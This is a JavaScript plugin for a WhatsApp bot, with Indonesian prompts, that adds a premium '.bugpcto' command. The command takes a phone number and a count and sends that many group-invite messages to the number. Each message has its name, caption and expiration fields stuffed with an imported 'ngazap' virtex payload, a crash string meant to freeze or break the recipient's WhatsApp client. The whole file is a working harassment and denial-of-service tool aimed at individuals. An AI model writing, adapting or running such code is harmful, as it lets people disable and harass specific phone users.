// ==> Recode By Marsandi
const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('@adiwajshing/baileys')
//========================================//
let handler = async(m, { conn, args, text }) => {
const { ngazap } = require('../src/virtex/ngazap')

//========================================//
let [nomor, jumlah] = text.split `|`
if (!nomor)return conn.reply(m.chat, `Nomornya?\nContoh .bugpcto 628××××|5`, ftrolii)
if (!jumlah) return conn.reply(m.chat, `Jumlahnya?\nContoh .bugpcto 628××××|5`, ftrolii)

for (let i = 0; i < jumlah; i++) {
var messa = await prepareWAMessageMedia({ image: thumb2 }, { upload: conn.waUploadToServer })
var groupInvite = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"groupInviteMessage": {
"groupJid": "85296556573-1328272333@g.us",
"inviteCode": "wFHwtOxGQN8OwK2x",
"inviteExpiration": `${ngazap}`,
"groupName": `${wem}${ngazap}`,
"caption": `${wem}${ngazap}`,
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: m.chat, quoted: doc })
conn.relayMessage(nomor + '@s.whatsapp.net', groupInvite.message, { messageId: groupInvite.key.id })

}
m.reply(`Succes Send Bug To : ${nomor}\nJumlah ${jumlah}`)
}

handler.help = ['bugpcto'].map(v => v + ' ( no|jmlh )')
handler.tags = ['gass']
handler.command = /^(bugpcto)$/i

handler.premium = true
module.exports = handler
